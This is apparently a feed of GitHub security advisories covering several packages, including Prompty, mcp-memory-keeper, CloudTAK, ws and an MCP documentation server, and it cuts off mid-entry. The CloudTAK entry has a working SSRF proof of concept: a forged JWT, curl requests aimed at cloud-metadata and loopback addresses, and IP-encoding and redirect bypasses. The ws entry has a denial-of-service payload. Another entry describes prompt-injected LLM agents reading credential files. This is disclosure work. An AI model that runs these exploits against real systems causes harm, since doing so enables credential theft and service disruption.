        <title type="html"><![CDATA[[@prompty/core] Prompty: Arbitrary file read via file reference expansion]]></title>
        <id>https://github.com/advisories/GHSA-wxhm-2mq7-7697</id>
        <link href="https://github.com/advisories/GHSA-wxhm-2mq7-7697"/>
        <updated>2026-07-17T19:46:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Prompty loaders expanded <code>${file:...}</code> references in <code>.prompty</code> frontmatter without enforcing that the resolved path stayed within an authorized directory. An attacker-controlled prompt file could use path traversal or an absolute path to cause the host application to read files accessible to the process.</p>
<h2 id="affected-packages">Affected packages</h2>
<ul>
<li>PyPI <code>prompty</code> versions <code>&lt;= 2.0.0b1</code>; fixed in <code>2.0.0b2</code></li>
<li>npm <code>@prompty/core</code> versions <code>&lt;= 2.0.0-beta.1</code>; fixed in <code>2.0.0-beta.2</code></li>
<li>crates.io <code>prompty</code> versions <code>&lt;= 2.0.0-beta.1</code>; fixed in <code>2.0.0-beta.2</code></li>
<li>NuGet <code>Prompty.Core</code> versions <code>&lt;= 2.0.0-beta.1</code>; fixed in <code>2.0.0-beta.2</code></li>
</ul>
<h2 id="impact">Impact</h2>
<p>Applications that load untrusted <code>.prompty</code> files, user-provided prompt paths, or prompt bundles from less-trusted locations could disclose local files available to the application process when expanded values are logged, returned, or otherwise exposed.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to the fixed runtime version for your ecosystem. The fix makes file references secure by default: <code>${file:...}</code> may only resolve within the directory tree containing the <code>.prompty</code> file. Host applications that need shared prompt assets outside that tree must explicitly provide allowed file roots through runtime load options. Absolute paths, <code>..</code> traversal, and symlink escapes outside allowed roots are rejected.</p>
<h2 id="fix-details">Fix details</h2>
<p>The patched runtimes canonicalize file-reference targets and allowed roots before reading referenced files, reject targets outside the prompt directory by default, and add regression coverage for traversal, absolute paths, explicit allowlists, and symlink escapes. The release commit is <code>88ac9948d7d37995edbb2f6d36913436626c39e1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/prompty/security/advisories/GHSA-wxhm-2mq7-7697">https://github.com/microsoft/prompty/security/advisories/GHSA-wxhm-2mq7-7697</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53598">https://nvd.nist.gov/vuln/detail/CVE-2026-53598</a></li>
<li><a href="https://github.com/microsoft/prompty/commit/88ac9948d7d37995edbb2f6d36913436626c39e1">https://github.com/microsoft/prompty/commit/88ac9948d7d37995edbb2f6d36913436626c39e1</a></li>
<li><a href="https://github.com/advisories/GHSA-wxhm-2mq7-7697">https://github.com/advisories/GHSA-wxhm-2mq7-7697</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxhm-2mq7-7697</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-17T19:46:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-memory-keeper] mcp-memory-keeper: Arbitrary local file read in context_import via unvalidated filePath]]></title>
        <id>https://github.com/advisories/GHSA-f7wf-v2vw-mpcx</id>
        <link href="https://github.com/advisories/GHSA-f7wf-v2vw-mpcx"/>
        <updated>2026-07-17T19:23:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>context_import</code> passed the caller-supplied <code>filePath</code> directly to <code>fs.readFileSync</code> with no path confinement. A malicious MCP client — or an LLM agent that is prompt-injected into calling the tool — could point <code>filePath</code> at <strong>any file readable by the server process</strong>, outside any session or export directory:</p>
<ul>
<li><strong>Full disclosure (JSON files):</strong> a valid-JSON target (e.g. another user's exported session, or a <code>*.json</code> credential / service-account file) is parsed and imported into the caller's session, then retrievable verbatim via <code>context_get</code> / <code>context_export</code>.</li>
<li><strong>Partial disclosure (any file):</strong> for a non-JSON target (e.g. <code>/etc/passwd</code>, an SSH key, a <code>.env</code>), <code>JSON.parse</code> throws and V8 includes a snippet of the file's leading bytes in the <code>SyntaxError</code> message, which was returned verbatim to the caller.</li>
</ul>
<p>Both <code>../</code> traversal and absolute paths worked — there was no path confinement of any kind.</p>
<p>In a typical MCP deployment the server runs on the developer's machine, so the reachable set includes other users' exported memory sessions, JSON credential/config files, and (in leading-bytes form) <code>.env</code> files, SSH keys, and <code>/etc/passwd</code>. The trigger is a tool argument, so the realistic threat model is an LLM agent prompt-injected into calling <code>context_import</code>, or any MCP client connected to the server.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <strong>0.13.0</strong> (PR #36):</p>
<ul>
<li>Imports are confined to a server-owned exports directory (<code>&lt;DATA_DIR&gt;/exports</code>, overridable via <code>MEMORY_KEEPER_EXPORT_DIR</code>), resolved with <code>realpathSync</code>. <code>../</code> traversal, absolute paths outside the directory, and symlink escapes are all rejected.</li>
<li>File read and <code>JSON.parse</code> are separate operations; read/parse failures return a generic message and never echo file bytes (the <code>SyntaxError</code>-message leak is gone). The database-write path is likewise generic.</li>
<li>An E2E security regression suite covers the reported arbitrary-read and traversal vectors, plus symlink escape, the directory-prefix boundary, and a no-existence-oracle check.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to <strong><code>&gt;= 0.13.0</code></strong>. There is no configuration-only workaround for affected versions.</p>
<h3 id="resources">Resources</h3>
<ul>
<li>Report: GitHub issue #35</li>
<li>Fix: PR #36</li>
</ul>
<h3 id="credit">Credit</h3>
<p>Reported by Zhihao Zhang (<a href="https://github.com/mcfly-zzh">@mcfly-zzh</a>).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mkreyman/mcp-memory-keeper/security/advisories/GHSA-f7wf-v2vw-mpcx">https://github.com/mkreyman/mcp-memory-keeper/security/advisories/GHSA-f7wf-v2vw-mpcx</a></li>
<li><a href="https://github.com/mkreyman/mcp-memory-keeper/issues/35">https://github.com/mkreyman/mcp-memory-keeper/issues/35</a></li>
<li><a href="https://github.com/mkreyman/mcp-memory-keeper/pull/36">https://github.com/mkreyman/mcp-memory-keeper/pull/36</a></li>
<li><a href="https://github.com/mkreyman/mcp-memory-keeper/commit/84f6dfa692736a34ff36e2d2cf2188b71facf73b">https://github.com/mkreyman/mcp-memory-keeper/commit/84f6dfa692736a34ff36e2d2cf2188b71facf73b</a></li>
<li><a href="https://github.com/mkreyman/mcp-memory-keeper/releases/tag/v0.13.0">https://github.com/mkreyman/mcp-memory-keeper/releases/tag/v0.13.0</a></li>
<li><a href="https://github.com/advisories/GHSA-f7wf-v2vw-mpcx">https://github.com/advisories/GHSA-f7wf-v2vw-mpcx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f7wf-v2vw-mpcx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-17T19:23:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tak-ps/cloudtak] TAK-PS-Stats Web UI: Authenticated full-read SSRF in CloudTAK basemap import (PUT /api/basemap) — no IP-classification guard]]></title>
        <id>https://github.com/advisories/GHSA-vqrw-qphh-p34v</id>
        <link href="https://github.com/advisories/GHSA-vqrw-qphh-p34v"/>
        <updated>2026-07-17T19:02:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>PUT /api/basemap</code> (the basemap import endpoint) fetches an attacker-supplied URL server-side with <strong>no SSRF protection whatsoever</strong>. Any authenticated user can submit a JSON body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>; the server calls <code>fetch(url)</code> against that URL and then reflects the response body (<code>name</code>, <code>attribution</code>, <code>tiles[0]</code>, zoom levels) back to the caller in the <code>OptionalTileJSON</code> response.</p>
<p>Because there is no IP-address classification, internal-only services are reachable: cloud metadata (<code>http://169.254.169.254/...</code>), loopback (<code>http://127.0.0.1/...</code>), RFC1918 ranges, and CGNAT. The response body flows back to the attacker, making this a <strong>full-read SSRF</strong> (not blind): the attacker reads the internal HTTP response verbatim. This enables theft of cloud instance credentials, internal service enumeration, and reading of internal-only HTTP endpoints from the network position of the CloudTAK API server.</p>
<p>The only URL check in the basemap protocol layer (<code>BasemapProtocol.isValidURL</code>, <code>api/lib/interface-basemap.ts</code>) validates the scheme is <code>http</code>/<code>https</code> only and performs <strong>no host/IP filtering</strong> — and the import path does not even call it; it goes straight from <code>new URL(rawURL)</code> to <code>fetch(url)</code>.</p>
<p>Three independent bypass classes were confirmed end-to-end against a real deployed build:</p>
<ol>
<li>Direct internal/loopback IP literals.</li>
<li>Alternate IP encodings (e.g. decimal <code>http://2130706433/</code> = <code>127.0.0.1</code>).</li>
<li>Redirect following — <code>fetch</code> uses the default <code>redirect: 'follow'</code>, so even a public initial host that 302-redirects to an internal address is followed with no re-validation.</li>
</ol>
<h3 id="vulnerable-code-fileline">Vulnerable code (file:line)</h3>
<p><code>api/routes/basemap.ts</code> — <code>importBasemapURL()</code> and the <code>PUT /basemap</code> handler (line numbers at commit <code>90d43bdd2fb7d9bd57cbce28c709d9e5207a475a</code>):</p>
<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/routes/basemap.ts#L68-L136</a></p>
<pre><code class="language-ts">// api/routes/basemap.ts
async function importBasemapURL(
    config: Config,
    rawURL: string,
    auth?: Static&lt;typeof BasemapImportAuth&gt;,
): Promise&lt;Static&lt;typeof OptionalTileJSON&gt;&gt; {
    const imported: Static&lt;typeof OptionalTileJSON&gt; = { type: Basemap_Type.RASTER };

    let url: URL;
    try {
        url = new URL(rawURL);            // (1) only well-formedness is checked
    } catch (err) {
        throw new Err(400, err instanceof Error ? err : new Error(String(err)), 'Invalid URL');
    }

    if (isEsriLayerURL(String(url))) { /* ... ESRI proxy path ... */ }

    const tjres = await fetch(url);        // (2) SSRF sink — no host/IP guard, default redirect:follow
    if (!tjres.ok) throw new Err(400, null, 'Unable to fetch TileJSON from source URL');

    const tjbody = await tjres.json() as Record&lt;string, any&gt;;
    if (tjbody.name) imported.name = tjbody.name;               // (3) internal response reflected to caller
    if (tjbody.attribution) imported.attribution = tjbody.attribution;
    if (Array.isArray(tjbody.tiles) &amp;&amp; tjbody.tiles.length) {
        imported.url = tjbody.tiles[0]...;
    }
    return imported;
}
</code></pre>
<p>The handler at <code>api/routes/basemap.ts</code> L139–L233 mounts this as <code>PUT /api/basemap</code> and gates it only with <code>Auth.is_auth(config, req)</code> (L157), i.e. <strong>any authenticated user</strong> with <code>application/json</code> body <code>{ type, url }</code> reaches <code>importBasemapURL((req.body).url, (req.body).auth)</code>.</p>
<p><code>BasemapProtocol.isValidURL</code> at <code>api/lib/interface-basemap.ts</code> L136 — the only "validation" in the protocol layer — checks the scheme only and performs no IP filtering:</p>
<p><a href="https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148">https://github.com/dfpc-coe/CloudTAK/blob/64bc1886ff56b62f53d765d69ac90ff9fc23b54b/api/lib/interface-basemap.ts#L136-L148</a></p>
<h3 id="how-input-reaches-the-sink">How input reaches the sink</h3>
<ol>
<li>Attacker authenticates as any CloudTAK user (any role) and obtains a bearer token.</li>
<li>Attacker sends <code>PUT /api/basemap</code> with <code>Content-Type: application/json</code> and body <code>{ "type": "...", "url": "&lt;attacker url&gt;" }</code>.</li>
<li>Handler <code>api/routes/basemap.ts</code> L155–L233 calls <code>Auth.is_auth(config, req)</code> (L157, any authenticated user passes) then <code>importBasemapURL(config, (req.body).url, (req.body).auth)</code> (L233).</li>
<li><code>importBasemapURL</code> (L68) does <code>new URL(rawURL)</code> (L79) and, for non-ESRI URLs, reaches <code>const tjres = await fetch(url)</code> (L99) — the SSRF sink. No host/IP classification occurs anywhere on this path; <code>fetch</code> uses the default <code>redirect: 'follow'</code>.</li>
<li>The response JSON is parsed (L104) and <code>name</code> / <code>attribution</code> / <code>tiles[0]</code> are copied into the response object (L106–L117) and returned to the attacker — closing the read loop.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Server-side full-read SSRF from the network position of the CloudTAK API server, reachable by any single authenticated user:</p>
<ul>
<li>Read the cloud instance metadata endpoint (<code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>) and exfiltrate temporary IAM credentials.</li>
<li>Reach and read internal-only HTTP services (databases' HTTP UIs, admin panels, other microservices) not exposed to the internet.</li>
<li>Enumerate internal hosts/ports via response/timing differences.</li>
</ul>
<p>Because the fetched body is reflected back to the caller, the attack is non-blind (full response disclosure), not merely a blind request-forgery.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>End-to-end reproduction against a <strong>real deployed CloudTAK API server</strong> (not a unit harness). An internal-only sentinel HTTP service is bound to <code>127.0.0.1:9000</code> (loopback only, unreachable from outside the host) and returns a TileJSON body carrying secret marker values; the proof is that the CloudTAK server fetches it server-side and reflects those secrets back to the attacker.</p>
<ol>
<li>Pinned install / build (v13.5.0, commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>):</li>
</ol>
<pre><code class="language-bash">git clone https://github.com/dfpc-coe/CloudTAK.git
cd CloudTAK &amp;&amp; git checkout v13.5.0
cd api &amp;&amp; npm ci
# Postgres reachable at postgres://postgres@localhost:5432/tak_ps_etl (PostGIS-enabled)
</code></pre>
<ol start="2">
<li>Deploy the real API server (test stack: SigningSecret defaults to the hardcoded <code>coe-wildland-fire</code>, migrations auto-apply, a default server row is auto-generated):</li>
</ol>
<pre><code class="language-bash">cd api
StackName=test \
SigningSecret=coe-wildland-fire \
POSTGRES='postgres://postgres@localhost:5432/tak_ps_etl' \
API_URL='http://localhost:5001' \
npx tsx index.ts --noevents --nosinks --nogeofence
# =&gt; "ok - http://localhost:5001"
</code></pre>
<ol start="3">
<li>Internal-only sentinel (<code>internal_sentinel.js</code>) — simulates an internal HTTP service / metadata endpoint, bound to loopback only:</li>
</ol>
<pre><code class="language-js">const http = require('http');
const fs = require('fs');
const srv = http.createServer((req, res) =&gt; {
  fs.appendFileSync('/tmp/ssrf_sentinel_hits.log',
    `[HIT ${new Date().toISOString()}] ${req.method} ${req.url} from=${req.socket.remoteAddress}\n`);
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify({
    name: 'INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c',
    attribution: 'leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e',
    tiles: ['http://127.0.0.1:9000/internal/{z}/{x}/{y}.png'],
    minzoom: 0, maxzoom: 19
  }));
});
srv.listen(9000, '127.0.0.1', () =&gt; console.log('sentinel on 127.0.0.1:9000 (internal-only)'));
</code></pre>
<pre><code class="language-bash">node internal_sentinel.js &amp;
# A redirector for the redirect-follow variant, also loopback-only:
node -e "require('http').createServer((q,r)=&gt;{r.writeHead(302,{Location:'http://127.0.0.1:9000/via-302-redirect'});r.end();}).listen(9100,'127.0.0.1')" &amp;
</code></pre>
<ol start="4">
<li>Attacker driver — mint a normal user JWT (signed with the deployed <code>SigningSecret</code>) and issue the three requests:</li>
</ol>
<pre><code class="language-bash">TOK=$(node -e "console.log(require('jsonwebtoken').sign({email:'attacker@evil.test',access:'user'},'coe-wildland-fire'))")

# (a) loopback / metadata-style path
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9000/latest/meta-data/iam/security-credentials/"}'

# (b) decimal-IP encoding of 127.0.0.1
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://2130706433:9000/decimal-ip-bypass"}'

# (c) public-looking host that 302-redirects to internal (redirect:follow)
curl -s -X PUT http://localhost:5001/api/basemap \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"type":"raster","url":"http://127.0.0.1:9100/start"}'
</code></pre>
<ol start="5">
<li>Captured output — all three return the internal sentinel's secret body to the attacker, and the loopback-only sentinel records the server-side hits:</li>
</ol>
<pre><code># HTTP response body returned to the attacker for (a), (b) and (c):
{"type":"raster","name":"INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c",
 "attribution":"leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e",
 "maxzoom":19,"minzoom":0,"url":"http://127.0.0.1:9000/internal/{$z}/{$x}/{$y}.png","format":"png"}

# /tmp/ssrf_sentinel_hits.log (sentinel is bound to 127.0.0.1 only):
[HIT 2026-06-03T05:01:13.606Z] GET /latest/meta-data/iam/security-credentials/ from=127.0.0.1
[HIT 2026-06-03T05:01:29.099Z] GET /decimal-ip-bypass from=127.0.0.1
[HIT 2026-06-03T05:01:30.151Z] GET /via-302-redirect from=127.0.0.1
</code></pre>
<p>The <code>name</code> and <code>attribution</code> values returned to the attacker are read verbatim from the internal service's HTTP response, demonstrating full-read SSRF. In a real cloud deployment the equivalent request <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> returns instance-role credentials.</p>
<ol start="6">
<li>Negative control — a public host is fetched normally (the endpoint is not globally broken); only the <em>reachability</em> of internal addresses is the defect.</li>
</ol>
<h3 id="end-to-end-reproduction-against-pinned-version">End-to-end reproduction (against pinned version)</h3>
<p>All of the above was executed against a real deployed CloudTAK API server built from tag <code>v13.5.0</code> (commit <code>64bc1886ff56b62f53d765d69ac90ff9fc23b54b</code>), booted with <code>StackName=test</code> against a PostGIS-enabled Postgres so migrations and routes load unmodified. The vulnerable build returned the internal sentinel's secret body (<code>INTERNAL-METADATA-aws-iam-role-SECRET-7f3a9c</code>, <code>leaked-internal-credential::AKIA-SENTINEL-DO-NOT-REDACT-9b2e</code>) for all three bypass variants, and the loopback-only sentinel recorded the three server-side hits shown above.</p>
<p>After applying the fix below to the same deployed build and restarting, the exact same three attacker requests instead return:</p>
<pre><code>{"status":403,"message":"URL resolves to a disallowed (internal) address","messages":[]}
</code></pre>
<p>and the sentinel log records <strong>no</strong> new hits, while <code>https://example.com/tile.json</code> continues to be fetched (returns <code>400 "Unable to fetch TileJSON"</code> — it reached the public host, the body just is not valid TileJSON). An <code>isBlockedIP</code> unit check passes 14/14: <code>169.254.169.254</code>, <code>127.0.0.1</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>100.64/10</code>, <code>::1</code>, <code>::ffff:127.0.0.1</code>, <code>fd00::/8</code>, <code>fe80::/10</code>, <code>64:ff9b::/96</code> all blocked; <code>8.8.8.8</code>, <code>1.1.1.1</code>, <code>93.184.216.34</code> all allowed.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Add an SSRF guard that (1) resolves the target hostname via DNS and rejects the request if <strong>any</strong> resolved address falls in a loopback / private / link-local (incl. <code>169.254.0.0/16</code> cloud metadata) / CGNAT / IPv6-ULA / IPv4-mapped / NAT64 range, and (2) follows redirects manually, re-validating the <code>Location</code> of every hop so a 302 to an internal address cannot bypass the check. Apply it to the import sink at <code>api/routes/basemap.ts</code> (the <code>fetch(url)</code> call) and to the ESRI/metadata fetch paths in the same file.</p>
<p>A self-contained <code>safeFetch(url)</code> helper (DNS resolution + per-hop re-validation) replacing the bare <code>fetch(url)</code> is sufficient; the same helper should back the other user-URL fetches in the basemap routes. A fix PR implementing exactly this guard is provided.</p>
<p>Note: a literal-string/prefix host blocklist (e.g. matching <code>127.</code>, <code>10.</code>, <code>192.168.</code>) is <strong>not</strong> sufficient — it is bypassed by alternate IP encodings, IPv6-mapped forms, and DNS-rebinding hostnames. The guard must classify the <strong>resolved</strong> numeric address.</p>
<h3 id="severity">Severity</h3>
<p>High. Pre-conditions: a single authenticated CloudTAK user account (any role). Impact: server-side full-read access to internal-only HTTP services and the cloud metadata endpoint from the API server's network position, enabling theft of instance credentials and internal reconnaissance. No additional privileges or victim interaction required.</p>
<h3 id="fix-pr-link">Fix PR link</h3>
<p>A fix PR implementing the DNS-resolving, redirect-re-validating <code>safeFetch</code> guard described above is provided to the maintainers via the private temporary fork associated with this advisory. The full guard source is also inlined under the Suggested fix section's reasoning above; the patch adds <code>api/lib/ssrf-guard.ts</code> and replaces the bare <code>fetch(url)</code> at <code>api/routes/basemap.ts</code> with <code>safeFetch(url)</code>.</p>
<h3 id="credits">Credits</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v">https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-vqrw-qphh-p34v</a></li>
<li><a href="https://github.com/advisories/GHSA-vqrw-qphh-p34v">https://github.com/advisories/GHSA-vqrw-qphh-p34v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqrw-qphh-p34v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-17T19:02:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ws] Denial of Service in ws]]></title>
        <id>https://github.com/advisories/GHSA-5v72-xg48-5rpm</id>
        <link href="https://github.com/advisories/GHSA-5v72-xg48-5rpm"/>
        <updated>2026-07-17T18:28:07.000Z</updated>
        <content type="html"><![CDATA[<p>Affected versions of <code>ws</code> can crash when a specially crafted <code>Sec-WebSocket-Extensions</code> header containing <code>Object.prototype</code> property names as extension or parameter names is sent.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<pre><code>const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: test',
    'Sec-WebSocket-Version: 8',
    `Sec-WebSocket-Extensions: ${payload}`,
    'Upgrade: websocket',
    '\r\n'
  ].join('\r\n');

  const socket = net.connect(3000, function () {
    socket.resume();
    socket.write(request);
  });
});
</code></pre>
<h2 id="recommendation">Recommendation</h2>
<p>Update to version 3.3.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a">https://github.com/websockets/ws/commit/c4fe46608acd61fbf7397eadc47378903f95b78a</a></li>
<li><a href="https://snyk.io/vuln/npm:ws:20171108">https://snyk.io/vuln/npm:ws:20171108</a></li>
<li><a href="https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407">https://github.com/websockets/ws/commit/f8fdcd40ac8be7318a6ee41f5ceb7e77c995b407</a></li>
<li><a href="https://github.com/websockets/ws/commit/a810bfa44f08c84ff3f43cc71327e9bb5fb273ef">https://github.com/websockets/ws/commit/a810bfa44f08c84ff3f43cc71327e9bb5fb273ef</a></li>
<li><a href="https://github.com/advisories/GHSA-5v72-xg48-5rpm">https://github.com/advisories/GHSA-5v72-xg48-5rpm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5v72-xg48-5rpm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2019-06-04T19:37:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-git-server] Unauthorized File Access in node-git-server]]></title>
        <id>https://github.com/advisories/GHSA-cv3v-7846-6pxm</id>
        <link href="https://github.com/advisories/GHSA-cv3v-7846-6pxm"/>
        <updated>2026-07-17T18:22:41.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>node-git-server</code> prior to 0.6.1 are vulnerable to Unauthorized File Access. It is possible to access any git repository by using absolute paths, which may allow attackers to access private repositories.</p>
<h2 id="recommendation">Recommendation</h2>
<p>Upgrade to version 0.6.1 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gabrielcsapo/node-git-server/pull/62">https://github.com/gabrielcsapo/node-git-server/pull/62</a></li>
<li><a href="https://github.com/gabrielcsapo/node-git-server/commit/ac26650f69bc445d71e4f2c55328676d10a4be43">https://github.com/gabrielcsapo/node-git-server/commit/ac26650f69bc445d71e4f2c55328676d10a4be43</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JS-NODEGITSERVER-474343">https://snyk.io/vuln/SNYK-JS-NODEGITSERVER-474343</a></li>
<li><a href="https://github.com/gabrielcsapo/node-git-server/commit/fb8d62710e3d78c796e04a33fcff66cea3f212f3">https://github.com/gabrielcsapo/node-git-server/commit/fb8d62710e3d78c796e04a33fcff66cea3f212f3</a></li>
<li><a href="https://github.com/gabrielcsapo/node-git-server/blob/0.2.0/lib/git.js">https://github.com/gabrielcsapo/node-git-server/blob/0.2.0/lib/git.js</a></li>
<li><a href="https://github.com/gabrielcsapo/node-git-server/tree/0.1.0">https://github.com/gabrielcsapo/node-git-server/tree/0.1.0</a></li>
<li><a href="https://github.com/advisories/GHSA-cv3v-7846-6pxm">https://github.com/advisories/GHSA-cv3v-7846-6pxm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cv3v-7846-6pxm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2020-09-03T21:15:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[claude-mem] claude-mem: The computeObservationContentHash Function is Vulnerable to Hash Collision]]></title>
        <id>https://github.com/advisories/GHSA-5gvr-v6qv-h5mm</id>
        <link href="https://github.com/advisories/GHSA-5gvr-v6qv-h5mm"/>
        <updated>2026-07-17T16:53:30.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in thedotmack claude-mem up to 11.0.1. The affected element is the function computeObservationContentHash of the file src/services/sqlite/observations/store.ts of the component Observation Content Hash Handler. This manipulation causes use of weak hash. The attack can only be executed locally. The attack's complexity is rated as high. The exploitability is described as difficult. Upgrading to version 12.0.0 is sufficient to fix this issue. Patch name: f32fda8b35e9fe9329f87da65c31149362a03f97. It is suggested to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11330">https://nvd.nist.gov/vuln/detail/CVE-2026-11330</a></li>
<li><a href="https://github.com/thedotmack/claude-mem/pull/1494">https://github.com/thedotmack/claude-mem/pull/1494</a></li>
<li><a href="https://github.com/thedotmack/claude-mem/commit/f32fda8b35e9fe9329f87da65c31149362a03f97">https://github.com/thedotmack/claude-mem/commit/f32fda8b35e9fe9329f87da65c31149362a03f97</a></li>
<li><a href="https://github.com/thedotmack/claude-mem/releases/tag/v12.0.0">https://github.com/thedotmack/claude-mem/releases/tag/v12.0.0</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-11330">https://vuldb.com/cve/CVE-2026-11330</a></li>
<li><a href="https://vuldb.com/submit/832401">https://vuldb.com/submit/832401</a></li>
<li><a href="https://vuldb.com/vuln/368870">https://vuldb.com/vuln/368870</a></li>
<li><a href="https://vuldb.com/vuln/368870/cti">https://vuldb.com/vuln/368870/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-5gvr-v6qv-h5mm">https://github.com/advisories/GHSA-5gvr-v6qv-h5mm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5gvr-v6qv-h5mm</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-05T15:32:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@andrea9293/mcp-documentation-server] @andrea9293/mcp-documentation-server: Web UI API binds to all interfaces without authentication by default]]></title>
        <id>https://github.com/advisories/GHSA-6f5r-5672-72j7</id>
        <link href="https://github.com/advisories/GHSA-6f5r-5672-72j7"/>
        <updated>2026-07-18T00:35:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@andrea9293/mcp-documentation-server</code> v1.13.0 documents that a Web UI starts automatically on port <code>3080</code>. However, the Web UI/API appears to bind to all network interfaces by default (<code>*:3080</code> / <code>0.0.0.0:3080</code>) instead of localhost-only, and its document-management API endpoints do not require authentication.</p>
<p>As a result, any network-reachable client on the same LAN, VM network, or container bridge can access the document-admin API without credentials. In my reproduction, I was able to enumerate documents, add a document, read its full content, search across the corpus, and delete the document through the host's LAN IP.</p>
<p>The issue is not that a Web UI exists. The issue is that a local document-management Web UI/API is exposed on all interfaces by default without authentication.</p>
<h3 id="details">Details</h3>
<p>The README documents that the Web UI starts automatically and tells users to open:</p>
<pre><code class="language-text">http://localhost:3080
</code></pre>
<p>It also documents <code>START_WEB_UI=true</code> and <code>WEB_PORT=3080</code> as the defaults.</p>
<p>The vulnerable behavior appears to come from starting the web server without binding it to localhost explicitly.</p>
<p>In <code>src/server.ts</code>, the Web UI is started unless <code>START_WEB_UI=false</code>:</p>
<pre><code class="language-ts">if (process.env.START_WEB_UI !== 'false') {
    initializeDocumentManager().then(manager =&gt; {
        return startWebServer(undefined, manager);
    }).then(() =&gt; {
        console.error('[Server] Web UI started (port=' + (process.env.WEB_PORT || '3080') + ')');
    })...
}
</code></pre>
<p>In <code>src/web-server.ts</code>, the Express app appears to listen with only the port:</p>
<pre><code class="language-ts">const server = app.listen(PORT, () =&gt; {
    console.log(`\n  🌐 MCP Documentation Server - Web UI`);
    console.log(`  ────────────────────────────────────`);
    console.log(`  Local:   http://localhost:${PORT}`);
    console.log(`  Network: http://0.0.0.0:${PORT}\n`);
});
</code></pre>
